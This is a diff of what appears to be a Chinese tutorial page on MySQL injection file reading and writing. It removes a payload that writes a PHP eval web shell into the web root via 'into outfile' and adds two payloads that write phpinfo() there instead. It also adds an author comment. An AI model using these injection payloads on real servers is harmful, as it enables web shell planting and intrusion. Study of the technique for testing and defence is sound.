@@ -105,6 +105,13 @@
                 
                 
 
+<!--
+ * @Author: reber
+ * @Mail: reber0ask@qq.com
+ * @Date: 2019-04-10 10:45:00
+ * @LastEditTime: 2019-08-15 15:19:43
+ -->
+
 <h3 id="0x00-load-file">0x00 load_file()</h3>
 
 <ul>
@@ -153,9 +160,17 @@
 </code></pre>
 
 <ul>
-<li><p>一般方法<br />
-当知道路径时，可以直接用?id=1 union select &ldquo;&lt;?php @eval($_POST[&lsquo;c&rsquo;]);?&gt;&rdquo; into outfile(&ldquo;C:/phpStudy/WWW/a.php&rdquo;)</p></li>
+<li>一般方法<br />
+当知道路径时，可以直接用</li>
+</ul>
 
+<p><code>id=1 union select &quot;&lt;? phpinfo();&gt;&quot; into outfile(&quot;C:/phpStudy/WWW/a.php&quot;)</code></p>
+
+<p>或者</p>
+
+<p><code>id=1 into outfile 'C:/phpStudy/WWW/a.php' fields terminated by '&lt;? phpinfo();&gt;';</code></p>
+
+<ul>
 <li><p>其他方法</p>
 
 <ul>
